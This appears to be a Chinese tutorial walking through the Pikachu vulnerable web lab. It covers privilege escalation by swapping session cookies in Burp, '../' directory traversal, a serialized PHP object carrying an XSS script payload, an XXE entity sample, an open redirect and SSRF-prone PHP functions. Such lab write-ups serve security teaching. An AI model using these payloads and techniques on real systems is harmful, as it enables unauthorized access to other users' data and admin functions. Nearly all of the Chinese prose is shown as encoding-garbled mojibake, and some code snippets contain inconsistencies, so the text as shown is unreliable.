è¶Šæƒæ¼æ´å±äºé€»è¾‘æ¼æ´,æ˜¯ç”±äºæƒé™æ ¡éªŒçš„é€»è¾‘ä¸å¤Ÿä¸¥è°¨å¯¼è‡´ã€‚-
æ¯ä¸ªåº”ç”¨ç³»ç»Ÿå…¶ç”¨æˆ·å¯¹åº”çš„æƒé™æ˜¯æ ¹æ®å…¶ä¸šåŠ¡åŠŸèƒ½åˆ’åˆ†çš„,è€Œæ¯ä¸ªä¼ä¸šçš„ä¸šåŠ¡åˆéƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚-
å› æ­¤è¶Šæƒæ¼æ´å¾ˆéš¾é€šè¿‡æ‰«æå·¥å…·å‘ç°å‡ºæ¥,å¾€å¾€éœ€è¦é€šè¿‡æ‰‹åŠ¨è¿›è¡Œæµ‹è¯•ã€‚

å¹³è¡Œè¶Šæƒï¼Œå…ˆè¿›è¡Œç™»å½•ï¼Œæç¤ºé‡ŒæŸ¥çœ‹è´¦å·å¯†ç ã€‚æœ‰ä¸€ä¸ªåŠŸèƒ½ç‚¹å‡»æŸ¥çœ‹ä¸ªäººä¿¡æ¯ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F207138b5266e4c45bca56916910ae19d.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_17%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å†ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œå‘åå°æä¾›äº†ä¸€ä¸ªgetè¯·æ±‚ã€‚æä¾›äº†å½“å‰ç”¨æˆ·çš„ç”¨æˆ·åï¼Œç„¶ååå°å°†å…¶ä¿¡æ¯è¿”å›åˆ°å‰å°ã€‚æˆ‘ä»¬åœ¨urlä¸­æŠŠLucyæ”¹æˆå…¶ä»–äººçœ‹çœ‹èƒ½ä¸èƒ½æŸ¥åˆ°ä¿¡æ¯ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6d508ad9401a4b5cb116c314341b41a9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è™½ç„¶ç™»å½•çš„æ˜¯Lucyçš„è´¦å·ä½†æ˜¯è¿”å›äº†liliçš„ä¿¡ã€‚

#### 3.9.2å‚ç›´è¶Šæƒ

å…ˆç™»å½•è¶…çº§ç®¡ç†å‘˜ï¼Œå»æ‰§è¡Œåªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥æ“ä½œçš„æ–°å¢è´¦å·çš„åŠŸèƒ½ï¼Œç”¨burpæŠ“åŒ…ã€‚é€€å‡ºç™»å½•ã€‚ç™»å½•æ™®é€šç”¨æˆ·ï¼Œæ‰§è¡Œæ–°å¢è´¦å·æ“ä½œã€‚å¦‚æœæˆåŠŸï¼Œåˆ™å­˜åœ¨å‚ç›´è¶Šæƒæ¼æ´ã€‚-
ç™»å½•ç®¡ç†å‘˜ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3afda4c4846f46a0b05786209955f4d1.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ·»åŠ ç”¨æˆ·ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F5fcf6ee05e1d4512972df971d84442ad.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
burpè¿›è¡ŒæŠ“åŒ…å¹¶å‘é€åˆ°repeaterä¸­ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F894d83ce8fc24e759b70380d13ace80f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é€€å‡ºç™»å½•ï¼Œåœ¨repeaterä¸­æ‰§è¡Œã€‚è¿”å›ç™»å½•ç•Œé¢ï¼Œè¦æ±‚ç™»å½•ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdbb27ddd40484271a145b735aa58dc2c.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é‡æ–°ç™»å½•ç®¡ç†å‘˜ï¼ŒæŸ¥çœ‹æ˜¯å¦æ·»åŠ æˆåŠŸã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0fed86b6ea3046dca02b2ea69275a76e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åªæœ‰ä¸€ä¸ª666ï¼Œæ·»åŠ å¤±è´¥ã€‚é€€å‡ºç™»å½•ï¼Œç™»å½•æ™®é€šç”¨æˆ·ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd9ad464cb7034d92a6a7d2edc76728e8.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åˆ·æ–°é¡µé¢ï¼Œåœ¨burpè·å–é¡µé¢ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4477d438321e406f8a62d690e2b8b520.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
cookieå°±æ˜¯æ™®é€šç”¨æˆ·çš„ç™»å½•æ€ã€‚Cookie: PHPSESSID=vfh1qvv694tj1dppt3bamvnhf1-
ç„¶åæ‰¾åˆ°ä¹‹å‰æ·»åŠ ç”¨æˆ·çš„postè¯·æ±‚ï¼Œå‘é€åˆ°repeaterã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa7bead8f243c49b899ef5bbb6abc1077.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç›®å‰çš„ç®¡ç†å‘˜ç™»å½•æ€æ˜¯é€€å‡ºçš„ï¼Œç°åœ¨æˆ‘ä»¬æŠŠè¿™ä¸ªç™»å½•æ€æ¢æˆç°åœ¨ç™»å½•çš„æ™®é€šç”¨æˆ·çš„ç™»å½•æ€ã€‚ä»¥æ™®é€šç”¨æˆ·çš„èº«ä»½æ‰§è¡Œç®¡ç†å‘˜æ“ä½œã€‚ç‚¹å‡»æ‰§è¡Œã€‚è¿”å›pikachuï¼Œåˆ·æ–°é¡µé¢ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd664b3f505774b5da5dc49625b719bc9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åˆå‡ºç°äº†ä¸€ä¸ª666ç”¨æˆ·ï¼Œè¯´æ˜å­˜åœ¨å‚ç›´è¶Šæƒæ¼æ´ã€‚

## 3.10 â€¦/â€¦/â€¦/(ç›®å½•éå†)

ç›®å½•éå†æ¼æ´æ¦‚è¿°-
åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œâ€¦/â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚-
çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚-
éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼šhttp://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚ï¼ˆå…³äºæ•æ„Ÿä¿¡æ¯æ³„éœ²ä½ ä½ å¯ä»¥åœ¨"i can see you ABC"ä¸­äº†è§£æ›´å¤šï¼‰-
æˆ‘ä»¬ç‚¹å‡»è¶…é“¾æ¥-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9362b4837a8b4ac2b40feca3caee7147.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å®é™…ä¸Šæ˜¯å‘åå°å‘é€äº†ä¸€ä¸ªæ–‡ä»¶åã€‚æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ–‡ä»¶åã€‚ä¿®æ”¹æˆâ€¦/dir.phpä¸Šçº§ç›®å½•ä¸‹çš„dir.phpï¼Œå¯ä»¥å‘æŒ¥æƒ³è±¡è®¿é—®æ›´å¤šå†…å®¹ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F71c11ca3296a46bb9324dd6da9f3f8c4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

## 3.11 I can see your ABC(æ•æ„Ÿä¿¡æ¯æ³„éœ²)

    ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ æ¯”å¦‚ï¼š
    ---é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;
    ---è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;
    ---å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;
    ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚ å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚ 
    æˆ‘ä»¬æ‰“å¼€æºç æœç´¢å¾—åˆ°æµ‹è¯•è´¦å·ã€‚
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2c9ab38ae1024c5badb299852161c4c6.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ä¹Ÿå¯ç›´æ¥è¾“å…¥urlï¼Œè¿›å…¥ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F57aca0eaf0974baca5af6d5f7378cea3.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

## 3.12 PHPååºåˆ—åŒ–æ¼æ´

åœ¨ç†è§£è¿™ä¸ªæ¼æ´å‰,ä½ éœ€è¦å…ˆææ¸…æ¥šphpä¸­serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚-
åºåˆ—åŒ–serialize()-
åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F540ecf6774c64f1db6d26ebc75aecf70.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ååºåˆ—åŒ–unserialize()å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚

     $u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
        echo $u->test; //å¾—åˆ°çš„ç»“æœä¸ºpikachu
        
    
        

åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜

> å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:-
> \_\_construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨-
> \_\_destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨-
> \_\_toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨-
> \_\_sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ-
> \_\_wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨

     æ¼æ´ä¸¾ä¾‹:
     class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);
    
        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
    
        

éšæ„è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼Œéƒ½ä¼šæç¤ºä¸€å¥è¯ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc841dc6a5fe14ee58bc28977f710c71e.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff0c1ee09709f4015a69f1291a5e10363.png)-
é€šè¿‡è¯¥ä»£ç å°†class aåºåˆ—åŒ–ä¸º

    O:1:"s":1:{s:4:"test";s:30:"<script>alert('fxlh')</script>";}
    
    
        

ç„¶åå°†è¯¥åºåˆ—åŒ–åçš„ç±»ä¼ å…¥åå°ï¼Œåå°æ¥å—åå°±ä¼šå°†æ¥å—åˆ°çš„ç±»è¿›è¡Œååºåˆ—åŒ–ï¼Œåœ¨åé¢æ¥ç€ä½¿ç”¨ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbc0f92e960cb447eba60bbe85f51c13b.png)-
åœ¨å°†åºåˆ—åŒ–åçš„ç±»æ‰§è¡Œæ—¶ï¼Œå¯èƒ½ä¼šè°ƒç”¨ç›¸åº”çš„æ„é€ æ–¹æ³•ï¼Œé€šè¿‡è¿™äº›æ„é€ æ–¹æ³•ï¼Œå°±ä¼šå¯¹ååºåˆ—åŒ–çš„ä»£ç æ‰§è¡Œï¼Œé€ æˆä¸€äº›ä¸å¯é¢„è®¡çš„åæœã€‚ä½†æ˜¯åœ¨å®é™…æƒ…å†µä¸­ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦æ„é€ å¤šç§payloadï¼Œæ¥æµ‹è¯•å‡ºåå°å¾€å¾€æ˜¯ä½¿ç”¨å“ªç§æ„é€ æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨ã€‚

## 3.13 XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ”»å‡»ï¼‰

XXE -â€œxml external entity injectionâ€-
æ—¢"xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´"ã€‚-
æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯"æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜"-
ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚-
xml:

    <!--ç¬¬ä¸€éƒ¨åˆ†: XMLå£°æ˜-- >
    <?xml version="1.0"?>
    <!--ç¬¬äºŒéƒ¨åˆ†:æ–‡æ¡£ç±»å‹å®šä¹‰DTID- >
    <!DOCTYPE note[ <!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ noteç±»å‹çš„æ–‡æ¡£--> 
    <!ENTITY entity - name SYSTEM "URL/URL"> <!- å¤–éƒ¨å®ä½“å£° æ˜-->
    ]]>
    <1--ç¬¬ä¸‰éƒ¨åˆ†:æ–‡æ¡£å…ƒ>
    <note>
    <to>Dave</to>
    <from> Tom</from>
    <head> Reminder </head>
    <body>You are a good man</body>
    </note>
    
        

DTDï¼šDocument Type Definitionå³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚

    1.DTDå†…éƒ¨å£°æ˜
    <!DOCTYPE æ ¹å…ƒç´ [å…ƒç´ å£°æ˜]>
    2. DTDå¤–éƒ¨å¼•ç”¨
    <!DOCTYPEæ ¹å…ƒç´ åç§°SYSTEM â€œ"å¤–éƒ¨DTDçš„URI" >
    3.å¼•ç”¨å…¬å…±DTD
    <!DOCTYPEæ ¹å…ƒç´ åç§°PUBLIC "DTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€ >
    
        

å¦‚æœä¸€ä¸ªæ¥å£æ”¯æŒæ¥æ”¶xmlæ•°æ®ï¼Œä¸”æ²¡æœ‰å¯¹xmlæ•°æ®åšä»»ä½•å®‰å…¨ä¸Šçš„æªæ–½ï¼Œå°±å¯-
èƒ½å¯¼è‡´XXEæ¼æ´ã€‚-
simplexml load string()å‡½æ•°è½¬æ¢å½¢å¼è‰¯å¥½çš„XMLå­—ç¬¦ä¸²ä¸ºSimpleXMLElementå¯¹è±¡-
XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„XMLã€‚-
æˆ‘ä»¬è¾“å…¥

    <?xml version = "1.0"?> 
    <!DOCTYPE note [     <!ENTITY hacker "xxe"> ]> 
    <name>&hacker;</name>
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6ee05e89937641689437220c05e1f9c4.png)

## 3.14 ä¸å®‰å…¨çš„URLé‡å®šå‘

ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚-
å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯-
å°±å¯èƒ½å‘ç”Ÿ"è·³é”™å¯¹è±¡"çš„é—®é¢˜ã€‚

urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:-
â€“>é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™

è¿™ä¸ªæ¼æ´æ¯”è¾ƒç®€å•,come on,æ¥æµ‹ä¸€æŠŠ!-
çœ‹åˆ°æœ‰ä¸€äº›è¶…é“¾æ¥ï¼Œæˆ‘ä»¬éƒ½ç‚¹ä¸€éå¯ä»¥å‘ç°ï¼Œæœ€åä¸€ä¸ªå¥½åƒæœ‰ä¸ªurlçš„å€¼ï¼Œæˆ‘ä»¬ä¿®æ”¹æˆhttps://www.baidu.com/ï¼Œå¯ä»¥å‘ç°å®ƒè·³è½¬æˆhttps://www.baidu.com/é¡µé¢äº†-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcd474e83fa854c4b933349d4269f4b35.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F34ab2ad79acb4cf5b9203a7cda77dcd0.png)-
ç†Ÿç»ƒåå¯ä»¥çš„å®šå‘è½¬åˆ°æå‰æ­å»ºå¥½çš„æ¶æ„ç«™ç‚¹ã€‚

## 3.15 SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰

SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )

å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶-
å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®

æ•°æ®æµ:æ”»å‡»è€…----->æœåŠ¡å™¨---->ç›®æ ‡åœ°å€

æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·

PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:-
file\_get\_contents()-
fsockopen()-
curl\_exec()

